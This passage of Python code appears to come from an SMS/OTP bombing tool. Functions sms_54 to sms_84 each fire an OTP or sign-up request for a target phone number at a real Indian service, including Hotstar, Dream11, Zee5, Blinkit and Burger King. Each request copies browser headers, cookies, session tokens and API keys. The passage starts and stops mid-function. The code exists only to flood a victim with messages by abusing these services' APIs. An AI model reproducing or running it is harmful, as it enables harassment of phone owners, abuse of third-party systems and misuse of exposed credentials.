      url = "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp"

      headers = {
    "Host": "omqkhavcch.execute-api.ap-south-1.amazonaws.com",
    "content-length": "96",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "action": "sendOTP",
    "sec-ch-ua-platform": '"Android"',
    "shop_name": "headsupfortails.myshopify.com",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "*/*",
    "origin": "https://headsupfortails.com",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://headsupfortails.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "username": "+91"+number,
  "type": "mobile",
  "domain": "headsupfortails.com",
  "recaptcha_token": ""
}

      response = requests.post(url, headers=headers, json=data)

# Brgkng api

def sms_54():
       
       url = "https://burgerking.in/api/consumer/api/v1/user/signUpWithPhone"
       
       data = {"phone_no":number}
       
       response = requests.post(url,json=data)

# Myduka api

def sms_55():
       
       url = "https://api-enterprise.mydukaan.io/api/account/buyer/sign-in/?hashcode=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aW1lc3RhbXAiOjE3MDUzMzgxMDEzNTcsImlhdCI6MTcwNTMzMDkwMX0.YcY_2WWg7sweGUjPqOmpCosXQDejAjozMz3muCZvzmo&mobile="+number+"&country_code=%2B91&mode=0&store_id=202299269&otp=&referred_by="
       
       response = requests.get(url)

# Mstkls api

def sms_56():
       
       url = "https://takelessons.com/graphql/"
       
       data = {
  "operationName": "getUserAndSendOtp",
  "variables": {
    "emailOrPhone": "+91"+number,
    "sendOTP": True
  },
  "query": "mutation getUserAndSendOtp($emailOrPhone: String!, $sendOTP: Boolean!) {\n  UsersMutations_GetUserAndSendOTP(text: $emailOrPhone, sendOTP: $sendOTP) {\n    userExists\n    userVerified\n    errors\n    identifier\n    __typename\n  }\n}"
}

       response = requests.post(url,json=data)

# Chukde api

def sms_57():
       
       url = "https://www.chukde.com/api/v1/customer/signup"
       
       data = {"ver_method":"sms","country_ext":"91","mobile":number,"name":"Jarvis","email":"rahulsingh78@gmail.com","pass":"Vk12@2929292j"}
       
       response = requests.post(url,data=data)

# Hotstar api

def sms_58():
       
      url = "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration"

      headers = {
    "Host": "www.hotstar.com",
    "Content-Length": "145",
    "Sec-Ch-UA": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "X-Hs-Request-Id": "26ed76-8d35c5-5c845a-420041",
    "Accept-Language": "eng",
    "X-Hs-Usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTcwNTk5NzQ3OCwiaWF0IjoxNzA1MzkyNjc4LCJpc3MiOiJUUyIsImp0aSI6Ijk0MDdkZTI5OGRiYzRjNmM5NThiZDZmZmUyMjdhODA0Iiwic3ViIjoie1wiaElkXCI6XCJlYWQ0MWRjZDVhOWY0ZDAyOTk5MDIyMDY0ZWE4ZGM1ZFwiLFwicElkXCI6XCIxNDNkNTU3NzdhZmY0ZDgxYTA0MjI1OTAxZjQwMDM2NVwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiMTAuMTEzLjI1NC42MFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJndWVzdFwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjpmYWxzZSxcImRldmljZUlkXCI6XCIyNmVjNDYtNzY2NDg5LTg3ZWI5LWNkYTg2XCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTcwNTM5MjY3ODc3OSxcImRwaWRcIjpcIjE0M2Q1NTc3N2FmZjRkODFhMDQyMjU5MDFmNDAwMzY1XCIsXCJzdFwiOjEsXCJkYXRhXCI6XCJDZ1FJQUJJQUNnd0lBQ0lJa0FIcXpzeUswVEVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLbEFFSUFDcVBBUW9DQ2dBS0JBb0NDQUlLYVFvSENBRVZBQUFBUUJJS0NnTmxibWNsdWVGQ1BSSUtDZ05vYVc0bEREd1NQeElLQ2dOdFlXd2w1MTRuUFJJS0NnTjBaV3dsa0IyL1BSSUtDZ04wWVcwbFViTHRQUklLQ2dOaVpXNGx4dW1TUFJJS0NnTnRZWElsYWVKTFBSSUtDZ05yWVc0bHBLTWFQQW9MQ2dJSUF4SUZDZ05vYVc0S0N3b0NDQVFTQlFvRGFHbHVcIn0iLCJ2ZXJzaW9uIjoiMV8wIn0.bvVYLS4CerqfavnmVPb-8fpRQkLveTknLvRLzjEzwX8",
    "X-Hs-Platform": "mweb",
    "X-Request-Id": "26ed76-8d35c5-5c845a-420041",
    "Sec-Ch-UA-Platform": "Android",
    "X-Hs-Client-Targeting": "ad_id:26ec46-766489-87eb9-cda86;user_lat:false",
    "X-Hs-Accept-Language": "eng",
    "Sec-Ch-UA-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "X-Hs-Client": "platform:mweb;app_version:24.01.05.2;browser:Chrome;schema_version:0.0.1106;network_data:3g",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Hs-Device-Id": "26ec46-766489-87eb9-cda86",
    "X-Country-Code": "in",
    "Origin": "https://www.hotstar.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "X-Akamai-Device=mweb; x_mwebmigration_exp=true; SELECTED__LANGUAGE=eng; ... (include all other cookies)"
}

      data = {
  "body": {
    "@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest",
    "phone_number": number,
    "initiate_by": 0,
    "recaptcha_token": ""
  }
}

      response = requests.post(url, headers=headers, json=data)

# Fancde api

def sms_59():
       
      url = "https://www.fancode.com/graphql"

      headers = {
    "Host": "www.fancode.com",
    "content-length": "527",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "expcapability": "true",
    "source": "fc-web",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://www.fancode.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.fancode.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    "cookie": "dh_user_id=abbe8200-b44b-11ee-8cc6-89c4643725b7; _gcl_au=1.1.985307869.1705394760; WZRK_G=975a0ea88ee6488d9401a0537c57d8f9; _ga_JFVZ8EN8YB=GS1.1.1705394760.1.0.1705394760.60.0.0; _ga=GA1.1.1740069352.1705394761; WZRK_S_W84-8RR-RR5Z=%7B%22p%22%3A1%2C%22s%22%3A1705394761%2C%22t%22%3A1705394761%7D; _fbp=fb.1.1705394762195.1349383173; _dd_s=rum=0&expire=1705395678603"
}

      data = {
  "operationName": "RequestOTP",
  "operation": "mutation",
  "variables": {
    "mobileNumber": number,
    "pageName": "HomePageV2"
  },
  "query": "fragment RequestOTPParams on AuthOTPResult {\n  message\n  success\n  totalAttemptCount\n  retryAfter\n  remainingAttemptCount\n  resendButtonActiveIn\n  newUser\n  email\n  password\n}\n\nmutation RequestOTP($mobileNumber: String!, $email: String, $password: String) {\n  requestAuthOTP(mobileNumber: $mobileNumber, email: $email, password: $password) {\n    ...RequestOTPParams\n  }\n}\n        "
}

      response = requests.post(url, headers=headers, json=data)

# Atothr api

def sms_60():
      
       url = "https://pfapi.a23games.in/a23user/signup_by_mobile_otp"
       
       data = {
  "channel": "web",
  "device_id": "a0a47f87-7206-4952-91af-e3c347906b3c",
  "model": "Google,Android SDK built for x86,10",
  "version": "1.0.5",
  "mobile": "+91"+number,
  "otp": "",
  "type": "signup",
  "referBy": ""
}

       response = requests.post(url,json=data)

def sms_61():
       
       url = "https://api.mxplayer.in/v1/account/sms?phoneNumber=+91"+number+"&messageType=message&language=en&device-density=2&userid=756a18de-6ac7-4cf3-b6e1-06d214b9540c&platform=com.mxplay.mobile&content-languages=hi,en&kids-mode-enabled=false"
       
       data = {
  "requestBody": "ol3/+CjUwtOMa6ZRP3acPQ\u003d\u003d"
}
    
       resposne = requests.post(url,json=data)

# Kukufm api

def sms_62():
       
       url = "https://kukufm.com/api/v1/users/auth/send-otp/"
       
       data = {"phone_number":"+91"+number}
       
       resposne = requests.post(url,json=data)


def sms_63():
       
       url = "https://web.pocketfm.com/send_otp/?phone_number=%2B91"+number+"&country_code=%2B91"
       
       data = {
  "locale": "IN",
  "device_id": "-2096972673",
  "platform": "web"
}

       resposne = requests.post(url,json=data)

# Drmele api

def sms_64():
       
      url = "https://www.dream11.com/auth/passwordless/init"

      headers = {
    "Host": "www.dream11.com",
    "Content-Length": "85",
    "Sec-Ch-UA": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "Sec-Ch-UA-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Device-Identifier": "macos",
    "Device": "pwa",
    "Sec-Ch-UA-Platform": "\"Android\"",
    "Origin": "https://www.dream11.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.dream11.com/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
    "Cookie": "dh_user_id=a3dec341-b407-11ee-b360-0181930c2d9a; _scid=367df713-b25a-4f4e-9a8a-7edcdde57e1f; _scid_r=367df713-b25a-4f4e-9a8a-7edcdde57e1f; _fbp=fb.1.1705398988953.1156408654; _sctr=1%7C1705343400000; __csrf=JzWohS; _dd_s=rum=2&id=14294e9f-cb57-460a-b0ef-72b21fca8902&created=1705399021237&expire=1705399951190"
}

      data = {
  "channel": "sms",
  "flow": "SIGNIN",
  "phoneNumber": number,
  "templateName": "default"
}

      response = requests.post(url, headers=headers, json=data)

# Myteam api

def sms_65():
       
      url = "https://web.myteam11.com/account/v1/send/otp"

      headers = {
    "Host": "web.myteam11.com",
    "Content-Length": "40",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "loginauthtoken": "42fbce0f-973d-4531-9702-fa678-d0a6ab",
    "apptype": "3",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "campaignid": "null",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://www.myteam11.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.myteam11.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "Mobile": number,
  "ReferCode": None
}

      response = requests.post(url, headers=headers, json=data)

# Apnatm api

def sms_66():
       
       url = "https://production.apna.co/api/userprofile/v1/otp/"
       
       data = {
  "phone_number": "91"+number,
  "retries": 0,
  "hash_type": "employer",
  "source": "employer"
}
    
       response = requests.post(url,json=data)

# Lklapp api

def sms_67():
       
       url = "https://api.getlokalapp.com/login/otp/generate/"
       
       data = {"mobile_no":number}
       
       response = requests.post(url,json=data) 

# Rnwbuy api

def sms_68():
       
       url = "https://www.renewbuy.com/api/consumerdashboard/auth/get_otp/"
       
       data = {
  "mobile": number,
  "receive_whatsapp_notification": True
}

       response = requests.post(url,json=data)

# Voovll api

def sms_69():

      url = "https://api.voovi.app/api/v1.0/loginWithOTP"

      headers = {
    'Host': 'api.voovi.app',
    'Content-Length': '49',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Signature': 'wRdD5BqZQv0s125JMqLvinTxB7o',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://voovi.app',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://voovi.app/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8'
}

      data = {
  "phoneNumber": "+91-"+number,
  "platform": "Web"
}

      response = requests.post(url, headers=headers, json=data)

# Zeeott api

def sms_70():

      url = "https://auth.zee5.com/v1/user/sendotp"

      headers = {
    "Host": "auth.zee5.com",
    "Content-Length": "26",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "device_id": "a5oabdM77HHnUp8wmUt6000000000000",
    "esk": "YTVvYWJkTTc3SEhuVXA4d21VdDYwMDAwMDAwMDAwMDBfX2dCUWFaTGlOZEdOOVVzQ0taYWxvZ2h6OXQ5U3RXTFNEX18xNzA1NDY0NDE3ODkw",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://www.zee5.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.zee5.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "phoneno": "91"+number
}

      response = requests.post(url, headers=headers, json=data)

# Selsme api

def sms_71():
       
      url = "https://www.shemaroome.com/users/mobile_no_signup"

      headers = {
    "Host": "www.shemaroome.com",
    "content-length": "46",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://www.shemaroome.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.shemaroome.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    "cookie": "theme_option=light_theme; _gcl_au=1.1.1837227737.1705480792; _ga=GA1.1.1483368039.1705480792; _pk_ref.1.e68e=%5B%22%22%2C%22%22%2C1705480793%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.1.e68e=8f6f8858780d1cd6.1705480793.; _pk_ses.1.e68e=1; _ga_7R95HMN23M=GS1.1.1705480796.1.0.1705480796.0.0.0; user_sub_status=U2FsdGVkX1%2FJBShiTk%2FU0u74uUTLbNP49XWBYxQhync%3D; video_preview=U2FsdGVkX18IDBkemFx5vK%2BPajrjQ9n4pmzjXSAlqIs%3D; is_premium=U2FsdGVkX19ub%2F38zfRSd3BXNNCocneo7aqufnm%2FLcE%3D; user_preview_played_status=U2FsdGVkX18isxECbFejBuT3Cnz9biSVqa5v0%2F2DZk0%3D; preview_available=U2FsdGVkX186EYLpfrvKUSMnchUNPiAofG6GZ5AjHrE%3D; external_preview_url=U2FsdGVkX19CDngNXe30wlJJYuBEWNPYM8i2OyQ9jrs%3D; contentid_user_id_sub_status=U2FsdGVkX1%2F67H3K5HgehjmL%2FhYeZWgwm2od3Kn9baM%3D; WZRK_G=6ed26b09629349f9b685b3457cd9f91c; _fbp=fb.1.1705480804806.589211410; _ga_TQRFGW5KY1=GS1.1.1705480792.1.1.1705480805.0.0.0; afUserId=725eca2d-e48e-46c1-9ce0-1f55d797c334-p; AF_SYNC=1705480805841; __sts=eyJzaWQiOjE3MDU0ODA4MDcyMzAsInR4IjoxNzA1NDgwODA3MjMwLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5zaGVtYXJvb21lLmNvbSUyRiIsInBldCI6MTcwNTQ4MDgwNzIzMCwic2V0IjoxNzA1NDgwODA3MjMwfQ==; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI4MjVhN2Q2Yi01MTA0LTQ5M2ItYWQ0My01ODYxY2M2OWJmZGIifQ==; __gads=ID=74ca88f20dc8f6e8:T=1705480804:RT=1705480804:S=ALNI_MZ_Yot7zF-dNwojUuLQb3NNX78JVA; __gpi=UID=00000ce3d4eb0dfd:T=1705480804:RT=1705480804:S=ALNI_MYWbEf6xsXMthhIqSH6VgKZDVdRyg; _ga_P2373KVFQV=GS1.1.1705480803.1.0.1705480808.55.0.0; _ga_YH2J0MMML1=GS1.1.1705480804.1.0.1705480808.56.0.0; _clck=tqjm7r%7C2%7Cfih%7C0%7C1477; __stdf=MA==; WZRK_S_R95-644-876Z=%7B%22p%22%3A1%2C%22s%22%3A1705480802%2C%22t%22%3A1705480809%7D; _clsk=mzp42h%7C1705480812137%7C1%7C1%7Cs.clarity.ms%2Fcollect; __stbpnenable=MA==; __stgeo=ImRlbmllZCI="
}

      data = {"mobile_no":"+91"+number,"registration_source":""}

      response = requests.post(url, headers=headers, data=data)

# Kchlnk api

def sms_72():
       
      url = "https://prod-api.viewlift.com/identity/signup?site=parija"
      
      headers = {
    "Host": "prod-api.viewlift.com",
    "Content-Length": "95",
    "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "X-Api-Key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef",
    "Sec-Ch-Ua-Platform": '"Android"',
    "Origin": "https://www.kancchalannka.com",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.kancchalannka.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
}

      data = {
  "requestType": "send",
  "phoneNumber": "+91"+number,
  "emailConsent": True,
  "whatsappConsent": True
}

      response = requests.post(url, headers=headers, json=data)

# Cfloor api

def sms_73():

      url = "https://www.commonfloor.com/nm/otp-generate?type=generateOtp"

      headers = {
    "Host": "www.commonfloor.com",
    "Content-Length": "17",
    "Sec-Ch-UA": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "Sec-Ch-UA-Platform": "Android",
    "Sec-Ch-UA-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "Accept": "*/*",
    "Origin": "https://www.commonfloor.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.commonfloor.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
    "Cookie": "capcha_cf=291876131465aa1826abdc0; abRand=40; __at=4534a789-4850-438c-b885-a4237d3d9587; _gid=GA1.2.619689304.1705646081; captcha_cookie=b234073e-09cd-4c69-9e9d-c8fafe37097f; _gcl_au=1.1.1688717643.1705646084; __gads=ID=b47ff911fa29382f:T=1705646087:RT=1705646087:S=ALNI_Ma5I7OjL6QL-O56J6XyJN-BFSeJ0A; __gpi=UID=00000cea8b650bbd:T=1705646087:RT=1705646087:S=ALNI_MbpRp8h38fWFfcJtZ_311meRY4THw; cityId=NzA%3D; city=QmFuZ2Fsb3Jl; cg=QmFuZ2Fsb3JlIGRpdmlzaW9u; iscg=0; _ga=GA1.2.422602550.1705646081; _jk_id=df8061a3-6f4f-489c-8bba-67bf2354062f.1705646084.0.1705646093.; _ga_2VLPXGQ9YW=GS1.1.1705646083.1.1.1705646107.0.0.0; _gat=1",
}

      data = {"mobile":number}

      response = requests.post(url, headers=headers, data=data)

# Lovlcl api

def sms_74():

      url = "https://homedeliverybackend.mpaani.com/auth/send-otp"

      headers = {
    "Host": "homedeliverybackend.mpaani.com",
    "Connection": "keep-alive",
    "Content-Length": "47",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "Accept-Language": "en",
    "sec-ch-ua-mobile": "?1",
    "Client-Code": "vulpix",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "x-access-token": "",
    "sec-ch-ua-platform": "\"Android\"",
    "Origin": "https://www.lovelocal.in",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.lovelocal.in/",
    "Accept-Encoding": "gzip, deflate, br",
}

      data = {
  "phone_number": number,
  "role": "CUSTOMER"
}

      response = requests.post(url, headers=headers, json=data)

# Imboat api

def sms_75():
       
       url = "https://otp.boat-lifestyle.com/login/sendotp"
       
       data = {"phone":number}
       
       response = requests.post(url,json=data)

# Foozaf App api

def sms_76():
       
       url = "https://www.fooza.in/api/checkUserphone"
       
       data = {
  "app_type": "Customer",
  "imageURL": "",
  "loginType": "normal",
  "mobile_token": "",
  "name": "",
  "phone_number": number,
  "social_id": ""
}

       response = requests.post(url,json=data)

# Mycrcl App api

def sms_77():
       
       url = "https://www.my11circle.com/api/fl/auth/v3/getOtp"
       
       data = {"email":"","mobile":number,"geoLocState":"","state":"","nae":{"gaid":"7521f72d-8551-45dd-ba1f-8f4f9db8d7f2","appVersion":"11100.57","clientTime":1705841707005,"dpi":0,"deviceId":"94cd8781003acb83","isDeviceRooted":0,"limitAdwrdsTrckngStatus":"0","os":"Android","osVersion":"10","screenSize":6,"utmParams":{"reqQueryParams":{"af_status":"Organic","af_message":"organic install","is_first_launch":True}},"dataSent":True,"install_flag":1,"distribution_medium":"PLAYSTORE","gcmId":"dxQxYysTSga0UKkB1R_CKC:APA91bELF6vIwgJ_COsLPEgNXLAKZYEu173Ua50vzXzWW4bTn6ACm9oSYBJa2fcv8aVRY3cyNBIOwtgiXf8FM0qGBBBGu0tHAys73g8tv_pHMgu3rum0hlxRU58_6p2j_MLZ43qNvLtp","connection_type":"NETWORK_TYPE_LTE","channelId":"2003","appsflyerId":"1705841696708-2585565613944362248","action":"getNaeAttribution"},"whatsappAlerts":True}
       
       response =  requests.post(url,json=data)

# Eight App Api

def sms_78():
       
       url = "https://prod-eight-apis-1.api.eight.network/api/send/otp"
       
       data = {"phone":number}
       
       resposne = requests.post(url,json=data)

# Doubtnut App  Api 

def sms_79():
       
       url = "https://api.doubtnut.com/v4/student/login"
       
       data = {
  "app_version": "7.10.37",
  "aaid": "7521f72d-8551-45dd-ba1f-8f4f9db8d7f2",
  "course": "",
  "phone_number": number,
  "language": "en",
  "udid": "94cd87824117862c",
  "class": "",
  "gcm_reg_id": "cHV5PRjxR9uTyQJaNLbjej:APA91bFryGbG1PxIkPzfbzT4leoneHck6qTZFA9mDKmw_sJMkEf6l-YJ0QOnQlPDwHYvd6knWAycdUjFMNyoNvCnkoTzwYwzYSILq8vQoSmTdvejC5Yk7MR82-zPdjWAU2VLp5A4yg4O"
}
       
       resposne = requests.post(url,json=data)

# Cricket Exchange App Api

def sms_80():
       
       url = "https://ce11api.com/auth/loginV2"
       
       data = {
  "platform": "8",
  "num": number,
  "apk_version": "80",
  "device": "94cd8782a2671afb",
  "token": "58a70cbdc013e738fbf35b77d8afb128d8b0a714b85b8a44576336d8b6ac3bcf"
}

       response = requests.post(url,json=data)

# Crickpe App Api

def sms_81():

      url = "https://app-api.crickpe.org/api/v1/auth/loginRegister"

      headers = {
    "Host": "app-api.crickpe.org",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "19",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/5.0.0-alpha.2",
    "Accept": "application/json",
    "Authorization": ""
}

      data = {"mobileNo":number}

      response = requests.post(url, headers=headers, data=data)

# Akhada App Api

def sms_82():

      url = "https://gu.fantasyakhada.com/user/login"

      headers = {
    'Host': 'gu.fantasyakhada.com',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Content-Length': '266',
    'Accept-Encoding': 'gzip',
    'User-Agent': 'okhttp/4.9.2'
}

      data = {
  "phone_no": number,
  "device_id": "94cd878769fb7c82",
  "device_type": "11",
  "phone_code": "91",
  "source": "",
  "device": {
    "version": "6.5",
    "device_name": "OPPO 2021",
    "device_model": "10",
    "memory": "1921437696",
    "brand": "OPPO",
    "app_version": "6.5"
  },
  "loginMandate": True
}

      response = requests.post(url, headers=headers, json=data)

# Blinkit App Api 

def sms_83():

      url = "https://api2.grofers.com/v2/accounts/"

      headers = {
    "Host": "api2.grofers.com",
    "content-length": "43",
    "app_client": "consumer_android",
    "app_version": "80150810",
    "accept": "application/json",
    "qd_sdk_version": "1",
    "rn_bundle_version": "1009002001",
    "host_app": "blinkit",
    "version_name": "15.81.0",
    "qd_sdk_request": "true",
    "app_api_version": "29",
    "lat": "0.0",
    "lon": "0.0",
    "device_id": "94cd879c46fff3a8",
    "registration_id": "dal8nufsT8e0CGTBEj4MPP:APA91bFJiAOJ7RKTQmacjvmWPPsipMIVeEq9WMs0vX5hlFX1oejM5x-GoHnXc0nDz5HaqtlAPQsT7YgOSxCiQTYxiRnK6piAdnmgi6sxuSYhSWJdwU65XjPiiSNpaAkcHx5bVinkhZ5e",
    "session_uuid": "31e17940-d8ea-486c-a476-b2459706f9e4",
    "x-zomato-installed": "false",
    "x-rider-installed": "false",
    "screen_density": "750px",
    "screen_density_num": "2.0",
    "cpu-level": "LOW",
    "memory-level": "AVERAGE",
    "storage-level": "HIGH",
    "network-level": "LOW",
    "battery-level": "EXCELLENT",
    "entry_source": "default",
    "cookie": "__cf_bm=2zXp9o2fVgHELgQBKPyi94lOH9pjcn5nhbY.jZopqKE-1705889747-1-ARQujunCTkRZ53EyfdOSpgXYchyXdhTqR/0X1sNa2ORb4Y5AGToGltzuNMQ4wkCVkULEYPG+o217rkns+XSYvhU=; path=/; expires=Mon, 22-Jan-24 02:45:47 GMT; domain=.grofers.com; HttpOnly; Secure; SameSite=None",
    "access_token": "",
    "auth_key": "45bff2b1437ff764d5e5b9b292f9771428e18fc40b7f3b7303d196ea84ab4341",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "com.grofers.customerapp/280150810 (Linux; U; Android 10; en_US; OPPO; Build/QP1A.190711.020; Cronet/119.0.6045.31)",
    "accept-encoding": "gzip, deflate, br"
}
      
      data = {"user_phone":number,"build_variant":"release"}
      
      response = requests.post(url, headers=headers,data=data)

# Wftotp Api

def sms_84():

      url = "https://api.wakefit.co/api/consumer-sms-otp/"

      headers = {
    "Host": "api.wakefit.co",
    "content-length": "43",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "api-secret-key": "ycq55IbIjkLb",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "api-token": "c84d563b77441d784dce71323f69eb42",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://www.wakefit.co",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
